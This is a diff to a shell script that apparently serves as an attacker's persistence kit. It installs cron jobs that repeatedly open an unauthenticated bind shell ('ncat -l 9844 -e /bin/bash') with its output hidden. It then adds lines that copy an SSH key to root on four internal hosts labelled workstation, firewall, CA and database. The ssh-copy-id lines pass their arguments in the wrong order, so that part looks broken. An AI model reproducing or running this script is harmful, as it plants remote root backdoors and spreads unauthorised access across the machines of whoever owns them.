@@ -1,15 +1,16 @@
-COMMAND="ncat -l 9844 -i 10 -v -e /bin/bash"
+COMMAND="ncat -l 9844 -i 20 -v -e /bin/bash"
 
 ## INSTALL CRON
-# create cronjob to activate the script in certain interals:
-# repeats every 10 minutes, during those 10min the pattern is:
-# at minute: 0, 2, 3, 6, 8
+# create cronjob to activate the script in certain intervals:
+# repeats every 20 minutes, during those 20min the pattern is:
+# at minute: 0, 5, 8, 11, 17, 19
 
-echo "10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
-echo "2-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
-echo "3-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
-echo "6-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
-echo "8-59/10 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "5-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "8-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "11-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "17-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
+echo "19-59/20 * * * * $COMMAND > /dev/null 2>&1" >> tmpcron
 
 
 # Check if cronjob already installed
@@ -22,3 +23,20 @@ else
 fi
 
 rm -rf tmpcron
+
+
+
+## SEND ssh key to all machine root users
+# ssh target
+WS_ADR=root@192.168.51.14
+FW_ADR=root@192.168.50.50
+CA_ADR=root@192.168.50.31
+DB_ADR=root@192.168.50.33
+
+# SSH Key file
+KEY=$HOME/.ssh/id_rsa
+
+ssh-copy-id -i $WS_ADR $KEY
+ssh-copy-id -i $FW_ADR $KEY
+ssh-copy-id -i $CA_ADR $KEY
+ssh-copy-id -i $DB_ADR $KEY
